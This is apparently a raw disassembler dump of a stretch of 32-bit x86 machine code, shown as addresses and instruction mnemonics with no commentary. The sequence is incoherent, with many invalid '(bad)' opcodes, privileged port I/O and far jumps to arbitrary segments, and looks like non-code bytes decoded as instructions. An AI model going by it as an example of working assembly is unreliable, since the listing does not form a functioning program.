  41f7f2:	shl    BYTE PTR [edi+0x4f],0x70
  41f7f6:	mov    ch,0xf
  41f7f8:	sbb    bh,BYTE PTR [eax]
  41f7fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7fb:	clc    
  41f7fc:	inc    edi
  41f7fd:	hlt    
  41f7fe:	sti    
  41f7ff:	sub    ebp,DWORD PTR [ebx+0xb3c1c8e]
  41f805:	and    cl,BYTE PTR [ecx-0x7f08168e]
  41f80b:	xlat   BYTE PTR ds:[ebx]
  41f80c:	cdq    
  41f80d:	popf   
  41f80e:	ss ss pushf 
  41f811:	es pop eax
  41f813:	push   edi
  41f814:	dec    edx
  41f815:	mov    eax,ds:0x4457cfe7
  41f81a:	shr    bh,0xe3
  41f81d:	lahf   
  41f81e:	in     al,dx
  41f81f:	cmp    BYTE PTR [ebp-0x3f2f0f89],cl
  41f825:	pusha  
  41f826:	jmp    0x9d88:0x62283fe6
  41f82d:	ins    BYTE PTR es:[edi],dx
  41f82e:	ja     0x41f891
  41f830:	lahf   
  41f831:	shl    DWORD PTR [edi],1
  41f833:	adc    BYTE PTR [ebx],bl
  41f835:	sbb    BYTE PTR [edx+eiz*1],0x26
  41f839:	call   0xd0218c93
  41f83e:	mov    esi,0x3a8fa541
  41f843:	mov    bl,0x4f
  41f845:	stos   DWORD PTR es:[edi],eax
  41f846:	mov    ah,0x90
  41f848:	inc    ebx
  41f849:	dec    edi
  41f84a:	mov    DWORD PTR [esi],0x23e7707a
  41f850:	out    0xe0,eax
  41f852:	sbb    eax,0xf35d828c
  41f857:	test   al,0x66
  41f859:	ret    
  41f85a:	repnz push sp
  41f85d:	jns    0x41f7fd
  41f85f:	inc    edx
  41f860:	rol    DWORD PTR [edx],cl
  41f862:	ficomp DWORD PTR [edi]
  41f864:	js     0x41f7f6
  41f866:	add    BYTE PTR [edi+eiz*1+0x67],ah
  41f86a:	cdq    
  41f86b:	xor    ah,BYTE PTR [edx-0x8]
  41f86e:	jp     0x41f8b3
  41f870:	sub    edx,edx
  41f872:	sub    al,0xae
  41f874:	inc    ebp
  41f875:	sbb    cl,BYTE PTR [eax+0x51eb180f]
  41f87b:	fwait
  41f87c:	mov    ch,BYTE PTR [ecx-0x8]
  41f87f:	push   ss
  41f880:	sbb    al,0xf6
  41f882:	dec    esp
  41f883:	enter  0x2195,0x0
  41f887:	adc    eax,0x6edfeac4
  41f88c:	push   ss
  41f88d:	cmp    eax,0xd5dc67b7
  41f892:	sbb    eax,0x5260c10b
  41f897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f898:	aaa    
  41f899:	popa   
  41f89a:	and    dh,BYTE PTR [ecx]
  41f89c:	jl     0x41f829
  41f89e:	outs   dx,BYTE PTR ds:[esi]
  41f89f:	sub    DWORD PTR [ecx-0xf1de758],ebp
  41f8a5:	push   edx
  41f8a6:	popf   
  41f8a7:	int    0x5e
  41f8a9:	xor    eax,DWORD PTR [esi-0x56aa6804]
  41f8af:	pop    esp
  41f8b0:	push   ds
  41f8b1:	fldenv [edx+0x4d]
  41f8b4:	repnz add cl,BYTE PTR [eax-0x15]
  41f8b8:	dec    edi
  41f8b9:	cs cmp al,0xc1
  41f8bc:	xor    al,0x8e
  41f8be:	test   ecx,edx
  41f8c0:	and    DWORD PTR [ecx],esp
  41f8c2:	push   esp
  41f8c3:	sti    
  41f8c4:	jo     0x41f90a
  41f8c6:	loopne 0x41f898
  41f8c8:	outs   dx,DWORD PTR ds:[esi]
  41f8c9:	and    cl,BYTE PTR [ecx-0x65]
  41f8cc:	imul   edx,DWORD PTR [eax-0x1288459e],0x6dfaeb78
  41f8d6:	imul   DWORD PTR [esi-0x5d]
  41f8d9:	(bad)
  41f8dc:	lods   al,BYTE PTR ds:[esi]
  41f8dd:	xor    bl,bl
  41f8df:	ins    DWORD PTR es:[edi],dx
  41f8e0:	mov    edx,0xe97a0ba8
  41f8e5:	mov    ebp,db7
  41f8e8:	ficom  WORD PTR [edx-0x6d]
  41f8eb:	pop    ebx
  41f8ec:	push   ds
  41f8ed:	add    ebp,DWORD PTR [esp+esi*8+0x4]
  41f8f1:	lahf   
  41f8f2:	imul   ebp,DWORD PTR [ecx+0x79],0x220ead4
  41f8f9:	lahf   
  41f8fa:	jle    0x41f92f
  41f8fc:	out    0x57,eax
  41f8fe:	push   eax
  41f8ff:	mov    ds:0xf2786daf,eax
  41f904:	out    0x98,al
  41f906:	repz (bad) 
  41f908:	adc    BYTE PTR [ebx+0x1ee91de1],cl
  41f90e:	lock xchg ebp,eax
  41f910:	ins    DWORD PTR es:[edi],dx
  41f911:	xchg   ecx,eax
  41f912:	push   edi
  41f913:	ret    
  41f914:	and    eax,0xfe0174c0
  41f919:	mov    bh,0x10
  41f91b:	push   es
  41f91c:	mov    al,ds:0x33cfbf23
  41f921:	int    0xa1
  41f923:	ret    
  41f924:	fnstcw WORD PTR [eax]
  41f926:	mov    edi,0xf3812c57
  41f92b:	dec    ebx
  41f92c:	push   ebx
  41f92d:	sub    DWORD PTR [ebx+0x7c],edx
  41f930:	retf   
  41f931:	in     eax,0xb4
  41f933:	out    dx,al
  41f934:	pop    ds
  41f935:	adc    al,0x10
  41f937:	std    
  41f938:	push   ds
  41f939:	aas    
  41f93a:	lahf   
  41f93b:	mov    eax,0xe709db8
  41f940:	xchg   ecx,eax
  41f941:	repnz mov dh,al
  41f944:	sbb    DWORD PTR [edx+0x23d5eeba],eax
  41f94a:	pop    ecx
  41f94b:	jp     0x41f91f
  41f94d:	jp     0x41f935
  41f94f:	mov    dh,0x7b
  41f951:	pop    esi
  41f952:	adc    dl,BYTE PTR [edi]
  41f954:	jecxz  0x41f9a5
  41f956:	sbb    ebx,ebp
  41f958:	pop    ebp
  41f959:	dec    edi
  41f95a:	pop    eax
  41f95b:	sbb    bl,ch
  41f95d:	and    bl,BYTE PTR [edx+esi*8]
  41f960:	fs aad 0xd5
  41f963:	data16 fwait
  41f965:	(bad)  
  41f966:	cmp    dl,dh
  41f968:	retf   
  41f969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f96a:	mov    ch,0xdf
  41f96c:	mov    bl,0x88
  41f96e:	jge    0x41f933
  41f970:	std    
  41f971:	mov    bh,0xfa
  41f973:	(bad)  
  41f974:	data16 dec BYTE PTR [esi-0x14becd60]
  41f97b:	hlt    
  41f97c:	in     eax,dx
  41f97d:	lea    edi,[ebx]
  41f97f:	and    DWORD PTR [ecx-0x44],ebx
  41f982:	inc    esp
  41f983:	out    0x27,al
  41f985:	sub    eax,0x77b02ebe
  41f98a:	push   cs
  41f98b:	sub    edi,DWORD PTR [eax]
  41f98d:	jmp    DWORD PTR ds:0xe8590481
  41f993:	call   0x6968f368
  41f998:	jp     0x41f9d7
  41f99a:	daa    
  41f99b:	ror    DWORD PTR ds:0xbb74d998,cl
  41f9a1:	push   esp
  41f9a2:	pop    ss
  41f9a3:	lahf   
  41f9a4:	dec    esp
  41f9a5:	in     eax,0x77
  41f9a7:	sbb    eax,0x2041468c
  41f9ac:	sub    esp,DWORD PTR ds:[ebx]
  41f9af:	ins    BYTE PTR es:[edi],dx
  41f9b0:	and    DWORD PTR [ecx+0x5392b63e],edi
  41f9b6:	cld    
  41f9b7:	inc    edi
  41f9b8:	jg     0x41f93b
  41f9ba:	cwde   
  41f9bb:	cmp    ecx,DWORD PTR [ecx-0x22]
  41f9be:	cli    
  41f9bf:	ja     0x41f97a
  41f9c1:	sub    ecx,esp
  41f9c3:	sbb    eax,0xa884bc82
  41f9c8:	dec    eax
  41f9c9:	inc    ebp
  41f9ca:	cli    
  41f9cb:	xchg   ecx,eax
  41f9cc:	lods   eax,DWORD PTR ds:[esi]
  41f9cd:	adc    eax,0x4258dcf5
  41f9d2:	mov    esp,ecx
  41f9d4:	test   al,0xd6
  41f9d6:	call   0x9d388aa4
  41f9db:	retf   
  41f9dc:	aam    0xdf
  41f9de:	jns    0x41f9c7
  41f9e0:	push   ebp
  41f9e1:	jns    0x41f9ec
  41f9e3:	inc    eax
  41f9e4:	xchg   edx,eax
  41f9e5:	aam    0x51
  41f9e7:	in     al,dx
  41f9e8:	adc    DWORD PTR [edx+0x21],esp
  41f9eb:	push   cs
  41f9ec:	aas    
  41f9ed:	sti    
  41f9ee:	jmp    0xace2:0x1b5a7b2b
  41f9f5:	shl    dh,1
  41f9f7:	leave  
  41f9f8:	sbb    dh,0x47
  41f9fb:	out    0x5f,eax
  41f9fd:	pop    esi
  41f9fe:	icebp  
  41f9ff:	call   0x110:0x94460ebf
  41fa06:	mov    ebp,0x7d9a656a
  41fa0b:	(bad)  
  41fa0d:	out    dx,eax
  41fa0e:	pop    ecx
  41fa0f:	jmp    0x41f9dd
  41fa11:	cmp    DWORD PTR [edi+esi*2+0x5e428368],0x38faf0fc
  41fa1c:	(bad)  
  41fa1d:	outs   dx,DWORD PTR ds:[esi]
  41fa1e:	mov    eax,ds:0x6b42510a
  41fa23:	mov    ebp,0x6690ecd1
  41fa28:	stos   DWORD PTR es:[edi],eax
  41fa29:	sub    DWORD PTR [edi],0x87b1fa0c
  41fa2f:	jae    0x41fa7e
  41fa31:	or     eax,0xd6f6cb58
  41fa36:	adc    al,ch
  41fa38:	sbb    ebp,esp
  41fa3a:	add    eax,esp
  41fa3c:	cmp    BYTE PTR es:[ebx+0x10b29a95],dh
  41fa43:	mov    ds:0xb513d4b1,eax
  41fa48:	mov    al,ds:0xc5a7e0d0
  41fa4e:	jl     0x41fa09
  41fa50:	jl     0x41fac8
  41fa52:	fdiv   DWORD PTR [edi]
  41fa54:	push   ebp
  41fa55:	sbb    DWORD PTR [edi+0x42],ebp
  41fa58:	adc    BYTE PTR ds:0x7503ac61,dl
  41fa5e:	cmp    eax,0xe33b3941
  41fa63:	aad    0xfb
  41fa65:	(bad)  
  41fa66:	sti    
  41fa67:	and    BYTE PTR [ebx+0x7c39121],bh
  41fa6d:	mov    esp,0xa63d1ea6
  41fa72:	jmp    0xb202:0x5f6516f
  41fa79:	fldenv [esi]
  41fa7b:	pop    ecx
  41fa7c:	lods   eax,DWORD PTR ds:[esi]
  41fa7d:	pop    ebx
  41fa7e:	jge    0x41fa3e
  41fa80:	loopne 0x41fa23
  41fa82:	add    BYTE PTR [ebp+0x3cff1df7],ch
  41fa88:	jae    0x41fadc
  41fa8a:	retf   
  41fa8b:	repnz in al,0x12
  41fa8e:	pushf  
  41fa8f:	mov    eax,0xb41666b4
  41fa94:	ret    0xc1d0
  41fa97:	inc    edi
  41fa98:	push   ds
  41fa99:	shl    BYTE PTR [ebp-0x35],1
  41fa9c:	stos   DWORD PTR es:[edi],eax
  41fa9d:	cwde   
  41fa9e:	mov    ah,0x58
  41faa0:	and    BYTE PTR [edx],dh
  41faa2:	cmp    esp,DWORD PTR [edi+0x71b62cf5]
  41faa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faa9:	imul   ebp,ebx,0x4783c358
  41faaf:	ins    BYTE PTR es:[edi],dx
  41fab0:	ret    0x2fbb
  41fab3:	loop   0x41fa8e
  41fab5:	jmp    0x2b2f:0xe1411376
  41fabc:	fist   WORD PTR [eax+0x3]
  41fabf:	inc    ecx
  41fac0:	stos   BYTE PTR es:[edi],al
  41fac1:	fidiv  WORD PTR [eax+0x474a8c83]
  41fac7:	mov    ds:0x90b01130,eax
  41facc:	xor    al,0xf7
  41face:	hlt    
  41facf:	mov    ah,0x5a
  41fad1:	jb     0x41fa92
  41fad3:	stos   DWORD PTR es:[edi],eax
  41fad4:	sbb    al,0xfc
  41fad6:	sbb    al,0x1
  41fad8:	add    DWORD PTR [esi-0x654fa6c9],ebp
  41fade:	out    dx,eax
	...
  41fae7:	add    BYTE PTR [eax],al
  41fae9:	add    BYTE PTR [eax+0x4a],bl
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	or     DWORD PTR [eax+edx*8],eax
  41faf9:	out    0x4a,eax
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [ebp+0x6],bh
  41fb00:	add    BYTE PTR [eax],al
  41fb02:	test   al,0xe8
  41fb04:	and    DWORD PTR [ecx],esp
  41fb06:	(bad)  [ebx+0x7d3a6599]
  41fb0c:	xchg   esi,eax
  41fb0d:	cmp    BYTE PTR [edx],dh
  41fb0f:	mov    bl,0x4b
  41fb11:	loope  0x41fb0f
  41fb13:	idiv   BYTE PTR [edx]
  41fb15:	jg     0x41fb37
  41fb17:	ss lahf 
  41fb19:	lods   al,BYTE PTR ds:[esi]
  41fb1a:	jb     0x41fb0f
  41fb1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb1d:	loop   0x41fb03
  41fb1f:	or     BYTE PTR [edx+0x42],0x4d
  41fb23:	lea    eax,[edi]
  41fb25:	cmp    al,0x8
  41fb27:	add    DWORD PTR [edi+0x730e70f4],ecx
  41fb2d:	dec    eax
  41fb2e:	xor    al,0x6e
  41fb30:	xor    DWORD PTR [eax+0x5092d4d3],0xffeb9d37
  41fb3a:	int    0x19
  41fb3c:	lea    esp,[ecx+0x76]
  41fb3f:	xor    edx,DWORD PTR [edx-0x36]
  41fb42:	retf   
  41fb43:	and    ah,al
  41fb45:	loopne 0x41fba3
  41fb47:	sub    ecx,DWORD PTR [esi+0x11a1e86e]
  41fb4d:	inc    eax
  41fb4e:	pop    eax
  41fb4f:	xor    eax,0x8adbc60
  41fb54:	xor    al,0xd6
  41fb56:	in     al,0x72
  41fb58:	jne    0x41fb3b
  41fb5a:	inc    esp
  41fb5b:	pop    eax
  41fb5c:	test   BYTE PTR [ebx+0x4474e030],bl
  41fb62:	ss cwde 
  41fb64:	daa    
  41fb65:	lods   al,BYTE PTR ds:[esi]
  41fb66:	(bad)  
  41fb68:	stc    
  41fb69:	repnz dec eax
  41fb6b:	adc    DWORD PTR [edi-0x66a24e64],ebp
  41fb71:	cmc    
  41fb72:	mov    bl,0xba
  41fb74:	push   edx
  41fb75:	dec    ebx
  41fb76:	push   eax
  41fb77:	mov    al,ds:0x121f7863
  41fb7c:	xor    ebx,DWORD PTR [eax-0x58]
  41fb7f:	imul   edx,DWORD PTR [di+0x30ad],0x6d
  41fb85:	(bad)  
  41fb86:	mov    dl,0x6a
  41fb88:	mov    DWORD PTR [edi+0x3de523ef],eax
  41fb8e:	in     al,dx
  41fb8f:	inc    esi
  41fb90:	lahf   
  41fb91:	mov    ds:0xe284ee35,eax
  41fb96:	lahf   
  41fb97:	adc    DWORD PTR [ebx+0x6e80c3b7],ecx
  41fb9d:	icebp  
  41fb9e:	cli    
  41fb9f:	ins    DWORD PTR es:[edi],dx
  41fba0:	and    al,0x9b
  41fba2:	xchg   ebp,eax
  41fba3:	(bad)  
  41fba4:	(bad)  
  41fba6:	sahf   
  41fba7:	int    0x7e
  41fba9:	cmp    dl,dl
  41fbab:	push   ebp
  41fbac:	out    dx,al
  41fbad:	sub    ch,bl
  41fbaf:	jmp    0x41fc0b
  41fbb1:	mov    edx,0x76685e42
  41fbb6:	adc    al,BYTE PTR ds:0x3efe1da0
  41fbbc:	mov    bh,0x44
  41fbbe:	mov    ds:0x34c2b548,eax
  41fbc3:	inc    edi
  41fbc4:	xor    dh,BYTE PTR [ecx-0x48]
  41fbc7:	adc    eax,0x72e901f6
  41fbcc:	add    edi,DWORD PTR [eax-0x4b529056]
  41fbd2:	or     esp,DWORD PTR [edi]
  41fbd4:	inc    eax
  41fbd5:	xchg   BYTE PTR [edx],ah
  41fbd7:	iret   
  41fbd8:	mov    gs,WORD PTR [ecx-0x2b]
  41fbdb:	inc    ebx
  41fbdc:	mov    ds:0x840f2a3f,eax
  41fbe1:	enter  0xd02b,0x6b
  41fbe5:	rol    DWORD PTR [ebx+0x42],1
  41fbe8:	sub    eax,0xce2e163b
  41fbed:	xor    BYTE PTR [eax-0x3c],dh
  41fbf0:	cmp    eax,0x453d2c3
  41fbf5:	enter  0x3379,0x9e
  41fbf9:	neg    BYTE PTR cs:[esi]
  41fbfc:	(bad)  
  41fbfd:	aaa    
  41fbfe:	mov    eax,ds:0x5caa9917
  41fc03:	cmp    DWORD PTR [ebx-0x4431b83c],ebx
  41fc09:	adc    al,0xb4
  41fc0b:	mov    WORD PTR [esi],ss
  41fc0d:	and    eax,0x5fa657a9
  41fc12:	popa   
  41fc13:	jmp    0x1cf3:0x92563b7
  41fc1a:	scas   eax,DWORD PTR es:[edi]
  41fc1b:	pusha  
  41fc1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc1d:	adc    eax,DWORD PTR [ecx-0x234358b0]
  41fc23:	lock xchg esp,eax
  41fc25:	lods   eax,DWORD PTR ds:[esi]
  41fc26:	sub    DWORD PTR [ebx],edx
  41fc28:	sahf   
  41fc29:	mov    ch,dh
  41fc2b:	sbb    al,BYTE PTR [edi-0x7a359792]
  41fc31:	(bad)  
  41fc32:	pop    ds
  41fc33:	inc    eax
  41fc34:	mov    edx,ss
  41fc36:	mov    ah,BYTE PTR [esi-0x7f]
  41fc39:	mov    edi,0x322aac84
  41fc3e:	xor    eax,0x2c8a6434
  41fc44:	push   eax
  41fc45:	add    bh,BYTE PTR [ebx+edx*8]
  41fc48:	sub    DWORD PTR ds:0x90784bf5,0xf051dcd2
  41fc52:	pcmpeqd mm7,QWORD PTR [eax+0x84c6d0]
  41fc59:	dec    BYTE PTR [edx+0xcee6d00]
  41fc5f:	jb     0x41fc28
  41fc61:	aaa    
  41fc62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc63:	mov    edi,0x5cf6f0a4
  41fc68:	xchg   esi,eax
  41fc69:	push   esp
  41fc6a:	push   edx
  41fc6b:	jp     0x41fc0c
  41fc6d:	dec    ebx
  41fc6e:	pop    ebp
  41fc6f:	add    bh,BYTE PTR [ebx+0x5b66c13b]
  41fc75:	ror    DWORD PTR [ecx+0x77abc10],1
  41fc7b:	mov    ds:0x68fa5a59,al
  41fc80:	popf   
  41fc81:	repz mov cl,BYTE PTR [edi-0x6a2875a8]
  41fc88:	jp     0x41fc63
  41fc8a:	inc    ebp
  41fc8b:	mov    ebx,0xf983e290
  41fc90:	or     cl,BYTE PTR [ebp-0x647dd88d]
  41fc96:	ret    
  41fc97:	push   0xffbea3f2
  41fc9c:	add    BYTE PTR [ecx],ch
  41fc9e:	sub    al,0xe4
  41fca0:	aad    0x52
  41fca2:	daa    
  41fca3:	add    eax,0x588a0a4c
  41fca8:	or     dh,BYTE PTR [edx+eax*8]
  41fcab:	in     al,dx
  41fcac:	(bad)  [esi+0x68]
  41fcaf:	jmp    0x7e54c672
  41fcb4:	cld    
  41fcb5:	sbb    DWORD PTR [edx],esi
  41fcb7:	ret    0x621e
  41fcba:	jmp    0x1f259055
  41fcbf:	adc    edi,DWORD PTR [ecx]
  41fcc1:	in     al,0x4c
  41fcc3:	mov    ss:0x76631ec8,eax
  41fcc9:	std    
  41fcca:	int3   
  41fccb:	dec    edi
  41fccc:	jp     0x41fd4b
  41fcce:	mov    DWORD PTR [edi],edx
  41fcd0:	mov    dl,0x8f
  41fcd2:	push   esp
  41fcd3:	sub    ah,dl
  41fcd5:	sbb    eax,0x7fd99f0
  41fcda:	pop    edx
  41fcdb:	jecxz  0x41fcea
  41fcdd:	jmp    0x42fd:0x1729ff31
  41fce4:	pop    ebx
  41fce5:	mov    cs,WORD PTR [eax-0x5c313df9]
  41fceb:	adc    al,BYTE PTR [ebx]
  41fced:	fs pusha 
  41fcef:	sbb    eax,0x8569bfdd
  41fcf4:	pop    edi
  41fcf5:	out    0x9f,al
  41fcf7:	sahf   
  41fcf8:	fstp   TBYTE PTR [esi]
  41fcfa:	jns    0x41fd2c
  41fcfc:	add    BYTE PTR [ecx+edi*8-0x62],bl
  41fd00:	and    dh,ch
  41fd02:	mov    esi,0xd7598a6
  41fd07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd08:	pop    ds
  41fd09:	sbb    BYTE PTR [esp+ebx*8-0x37a3f8bd],bl
  41fd10:	ins    BYTE PTR es:[edi],dx
  41fd11:	mov    esp,0x753d9304
  41fd16:	push   ebp
  41fd17:	mov    ds:0xeb2f4190,al
  41fd1c:	inc    esi
  41fd1d:	mov    ebp,DWORD PTR [ecx]
  41fd1f:	mov    ds:0x3aaff4cb,eax
  41fd24:	stc    
  41fd25:	enter  0x13a2,0x23
  41fd29:	xor    ch,bh
  41fd2b:	loope  0x41fd1c
  41fd2d:	test   ecx,edi
  41fd2f:	inc    edx
  41fd30:	lahf   
  41fd31:	dec    edx
  41fd32:	sub    esi,DWORD PTR [edx+edi*8]
  41fd35:	es call 0x4dbd:0x6fcfad6e
  41fd3d:	xchg   esp,eax
  41fd3e:	neg    DWORD PTR [ebx+edx*4]
  41fd41:	or     al,0x8f
  41fd43:	aas    
  41fd44:	out    dx,eax
  41fd45:	popf   
  41fd46:	leave  
  41fd47:	mov    dh,0xc1
  41fd49:	sub    eax,0x67a8406f
  41fd4e:	mov    BYTE PTR [esi+ecx*2-0x5c42963f],bl
  41fd55:	sbb    eax,0x429810d3
  41fd5a:	aaa    
  41fd5b:	dec    edx
  41fd5c:	add    edx,esp
  41fd5e:	int    0xea
  41fd60:	jl     0x41fd4c
  41fd62:	sahf   
  41fd63:	mov    WORD PTR [ebx],ds
  41fd65:	fwait
  41fd66:	pop    edx
  41fd67:	mov    ds:0x36bb002c,al
  41fd6c:	repnz fst QWORD PTR gs:[ebx+0x47]
  41fd71:	bound  ecx,QWORD PTR [ecx-0xa20bf28]
  41fd77:	xlat   BYTE PTR ds:[ebx]
  41fd78:	add    BYTE PTR [ecx+0x4f],al
  41fd7b:	or     eax,0x3b641a79
  41fd80:	adc    ebx,DWORD PTR [edx+ecx*8-0x30127966]
  41fd87:	add    eax,DWORD PTR [eax+0x24a2d9c4]
  41fd8d:	jl     0x41fd65
  41fd8f:	lahf   
  41fd90:	hlt    
  41fd91:	jl     0x41fd8b
  41fd93:	jmp    0x41fda3
  41fd95:	test   eax,0x11cdac03
  41fd9a:	push   ecx
  41fd9b:	popfw  
  41fd9d:	ins    DWORD PTR es:[edi],dx
  41fd9e:	pusha  
  41fd9f:	int    0x88
  41fda1:	pop    gs
  41fda3:	aas    
  41fda4:	add    al,0x57
  41fda6:	mov    DWORD PTR [esi],edi
  41fda8:	stc    
  41fda9:	jle    0x41fe0a
  41fdab:	loope  0x41fe0b
  41fdad:	jns    0x41fe03
  41fdaf:	or     eax,0x931ef5a2
  41fdb4:	retf   0xbf3
  41fdb7:	mov    eax,0x540990c
  41fdbc:	int    0xe8
  41fdbe:	fnstcw WORD PTR [edx-0xa39f2a6]
  41fdc4:	xchg   edi,eax
  41fdc5:	jne    0x41fdbd
  41fdc7:	sbb    al,0xa9
  41fdc9:	and    BYTE PTR [esi-0x3f],bl
  41fdcc:	inc    esp
  41fdcd:	mov    bl,0x59
  41fdcf:	xchg   ebp,eax
  41fdd0:	std    
  41fdd1:	dec    eax
  41fdd2:	popf   
  41fdd3:	ins    BYTE PTR es:[edi],dx
  41fdd4:	add    al,0xf2
  41fdd6:	pop    eax
  41fdd7:	ss pushf 
  41fdd9:	inc    ecx
  41fdda:	mov    ds:0xc9221e3f,al
  41fddf:	cmc    
  41fde0:	pop    esi
  41fde1:	mov    ebp,DWORD PTR [edi+0x50]
  41fde4:	outs   dx,DWORD PTR ds:[esi]
  41fde5:	xchg   edi,eax
  41fde6:	or     edi,DWORD PTR ds:0xde854f87
  41fdec:	addr16 pop es
  41fdee:	pop    ss
  41fdef:	retf   
  41fdf0:	jecxz  0x41fdc4
  41fdf2:	out    dx,al
  41fdf3:	cmp    bh,BYTE PTR ss:[edx+eiz*2+0x6d]
  41fdf8:	dec    eax
  41fdf9:	ror    BYTE PTR [eax+0x4],0x2a
  41fdfd:	je     0x41fdad
  41fdff:	lds    ebp,FWORD PTR [ebx]
  41fe01:	out    0xf,al
  41fe03:	inc    ebp
  41fe04:	or     bh,bh
  41fe06:	sbb    eax,DWORD PTR [ebx-0x35]
  41fe09:	(bad)  
  41fe0a:	xor    ah,BYTE PTR [edi-0x2d066079]
  41fe10:	cli    
  41fe11:	sub    ecx,DWORD PTR [eax+0x62]
  41fe14:	leave  
  41fe15:	jne    0x41fe27
  41fe17:	jns    0x41fe27
  41fe19:	push   ecx
  41fe1a:	(bad)  
  41fe1b:	mov    dl,0x2f
  41fe1d:	mov    ds:0x83925098,eax
  41fe22:	push   es
  41fe23:	not    DWORD PTR [esi-0x45]
  41fe26:	mov    al,0x13
  41fe28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe29:	ret    
  41fe2a:	xchg   BYTE PTR [ecx+0x1f],cl
  41fe2d:	je     0x41fe37
  41fe2f:	jecxz  0x41fe02
  41fe31:	mov    eax,ds:0x97191edd
  41fe36:	mov    bl,0xa3
  41fe38:	inc    esi
  41fe39:	in     al,dx
  41fe3a:	(bad)  
  41fe3b:	or     edx,eax
  41fe3d:	mov    ch,0x85
  41fe3f:	cmp    esi,ebx
  41fe41:	jmp    0x7279:0x7d238b55
  41fe48:	xchg   esp,eax
  41fe49:	es inc ecx
  41fe4b:	adc    ch,al
  41fe4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe4e:	cli    
  41fe4f:	and    al,0xa0
  41fe51:	sar    esi,0x27
  41fe54:	pop    ss
  41fe55:	jg     0x41fe85
  41fe57:	push   edx
  41fe58:	addr16 mov cl,0x4a
  41fe5b:	fs popf 
  41fe5d:	cmp    bl,dl
  41fe5f:	xchg   edx,eax
  41fe60:	hlt    
  41fe61:	xor    ebx,DWORD PTR [edi+0x1325708b]
  41fe67:	fld    QWORD PTR [edx]
  41fe69:	inc    esi
  41fe6a:	add    esp,esp
  41fe6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe6d:	clc    
  41fe6e:	or     bl,BYTE PTR [esi+0x71]
  41fe71:	je     0x41fe96
  41fe73:	add    eax,0xf8a8825f
  41fe78:	das    
  41fe79:	idiv   BYTE PTR [ebp+ebx*2+0xa]
  41fe7d:	aam    0x1
  41fe7f:	jp     0x41fe32
  41fe81:	pop    ebp
  41fe82:	outs   dx,BYTE PTR ds:[esi]
  41fe83:	test   al,al
  41fe85:	je     0x41fee4
  41fe87:	mov    ch,0x1c
  41fe89:	pop    ds
  41fe8a:	stos   BYTE PTR es:[edi],al
  41fe8b:	aas    
  41fe8c:	mov    edi,0xb75ba4dd
  41fe91:	into   
  41fe92:	jmp    0x9a2b:0xb9d5a07f
  41fe99:	std    
  41fe9a:	xor    BYTE PTR [edx],cl
  41fe9c:	mov    ?,WORD PTR [ebp+edi*2+0x4c24921f]
  41fea3:	cwde   
  41fea4:	push   0x1c
  41fea6:	out    dx,al
  41fea7:	int    0xc4
  41fea9:	mov    ecx,DWORD PTR [ebp+0x3e]
  41feac:	or     DWORD PTR [esi+ecx*2-0x583415d6],edx
  41feb3:	mov    bl,BYTE PTR [ebx-0x7f4587bf]
  41feb9:	jb     0x41ff05
  41febb:	cmp    BYTE PTR [esi+eiz*2+0x42],bl
  41febf:	idiv   BYTE PTR [edi+0x4ca9fe93]
  41fec5:	xlat   BYTE PTR ds:[ebx]
  41fec6:	daa    
  41fec7:	mov    dh,0x63
  41fec9:	sbb    eax,DWORD PTR [edx+0x7145d9fb]
  41fecf:	xchg   ecx,eax
  41fed0:	mov    BYTE PTR [ebx+0x3cd01119],0xa3
  41fed7:	jnp    0x41ff0b
  41fed9:	xchg   ebx,ebp
  41fedb:	repz clc 
  41fedd:	(bad)  
  41fede:	mov    eax,ds:0x609abf6e
  41fee3:	pop    edi
  41fee4:	push   edx
  41fee5:	sbb    eax,0x2b6b069c
  41feea:	inc    ebp
  41feeb:	jmp    0x41feb4
  41feed:	push   0xffffff86
  41feef:	push   0xffffff86
  41fef1:	and    edi,ebp
  41fef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef4:	mov    ah,0x9d
  41fef6:	int    0xfb
  41fef8:	push   es
  41fef9:	lods   eax,DWORD PTR ds:[esi]
  41fefa:	repz add eax,0xe54e554e
  41ff00:	add    al,0x50
  41ff03:	or     BYTE PTR [edx],0xe8
  41ff06:	push   0xffffff97
  41ff08:	test   esi,esi
  41ff0a:	push   edi
  41ff0b:	jl     0x41feea
  41ff0d:	addr16 in eax,0xbb
  41ff10:	sub    ebx,DWORD PTR [edi+edx*2-0x6b3bb4cb]
  41ff17:	and    BYTE PTR [ebp+0x2f645b9],bl
  41ff1d:	in     eax,0x33
  41ff1f:	inc    esi
  41ff20:	jl     0x41ff47
  41ff22:	jae    0x41ff5f
  41ff24:	fnsave [edi-0x5d]
  41ff27:	or     esp,DWORD PTR [ecx+edi*1+0x50]
  41ff2b:	das    
  41ff2c:	cmp    eax,0x23ee6383
  41ff31:	push   ebp
  41ff32:	sub    al,0x4
  41ff34:	aad    0xd6
  41ff36:	pop    ecx
  41ff37:	mov    edi,0x15019c4e
  41ff3c:	xchg   esp,eax
  41ff3d:	imul   ecx,ecx,0xb173cafd
  41ff43:	cmp    ebx,DWORD PTR ds:0x9da605d9
  41ff49:	cmp    eax,0x377db03c
  41ff4e:	int    0x5b
  41ff50:	stos   DWORD PTR es:[edi],eax
  41ff51:	popf   
  41ff52:	out    0x1,eax
  41ff54:	pop    edx
  41ff55:	mov    ds:0xbe0e6677,al
  41ff5b:	shl    eax,cl
  41ff5d:	add    bh,0x25
  41ff60:	fcomp  DWORD PTR ds:0x6006ba69
  41ff66:	and    bh,BYTE PTR [ecx+0xd]
